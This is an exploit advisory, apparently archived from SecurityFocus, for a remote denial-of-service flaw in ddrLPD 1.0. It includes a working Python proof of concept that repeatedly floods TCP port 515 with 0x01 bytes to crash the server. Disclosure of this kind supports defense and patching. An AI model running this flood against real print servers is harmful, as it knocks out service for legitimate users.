source: http://www.securityfocus.com/bid/39904/info

ddrLPD is prone to a remote denial-of-service vulnerability.

An attacker can exploit this issue to crash the affected application, denying service to legitimate users.

ddrLPD 1.0 is vulnerable; other versions may also be affected. 

#==================================================================================================#
#                                                                                                  #
#  $$$$$$$\  $$\                     $$\                                     $$\        $$$$$$\    #
#  $$  __$$\ \__|                    $$ |                                    $$ |      $$  __$$\   #
#  $$ |  $$ |$$\  $$$$$$$\  $$$$$$\  $$$$$$$\   $$$$$$\  $$$$$$$\   $$$$$$\  $$ |      $$ /  $$ |  #
#  $$$$$$$\ |$$ |$$  _____|$$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$  __$$\ $$ |      $$$$$$$$ |  #
#  $$  __$$\ $$ |\$$$$$$\  $$ /  $$ |$$ |  $$ |$$$$$$$$ |$$ |  $$ |$$ /  $$ |$$ |      $$  __$$ |  #
#  $$ |  $$ |$$ | \____$$\ $$ |  $$ |$$ |  $$ |$$   ____|$$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |  #
#  $$$$$$$  |$$ |$$$$$$$  |$$$$$$$  |$$ |  $$ |\$$$$$$$\ $$ |  $$ |\$$$$$$  |$$ |      $$ |  $$ |  #
#  \_______/ \__|\_______/ $$  ____/ \__|  \__| \_______|\__|  \__| \______/ \__|      \__|  \__|  #
#                          $$ |                                                                    #
#                          $$ |                                         Plastics Make It Possible  #
#                          \__|                                                                    #
#                                                                                                  #
#==================================================================================================#
#                                                                                                  #
# Vulnerability............Denial-of-Service                                                       #
# Software.................ddrLPD 1.0                                                              #
# Download.................http://ddr.web.id/files/ddrLPDsetup.exe                                 #
# Date.....................4/29/10                                                                 #
#                                                                                                  #
#==================================================================================================#
#                                                                                                  #
# Site.....................http://cross-site-scripting.blogspot.com/                               #
# Email....................john.leitch5@gmail.com                                                  #
#                                                                                                  #
#==================================================================================================#
#                                                                                                  #
# ##Description##                                                                                  #
#                                                                                                  #
# Sending packets composed of bytes between 1 and 5 (inclusive) causes the the server to crash.    #
#                                                                                                  #
# ddrlpd.exe: The instruction at 0x50431A referenced memory at 0x0. The memory could not be read   #
# (0x0050431A -> 00000000)                                                                         #
#                                                                                                  #
# ##Proof of Concept##                                                                             #
import socket
host ='localhost'

try:
    while 1:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((host, 515))
        s.settimeout(1.0)
        
        print 'connected',

        try:
            while 1:        
                s.send('\x01'*8192)
                print '.',
        except Exception:
            print '\nconnection closed'
            pass
        
except Exception:
    print 'couldn\'t connect'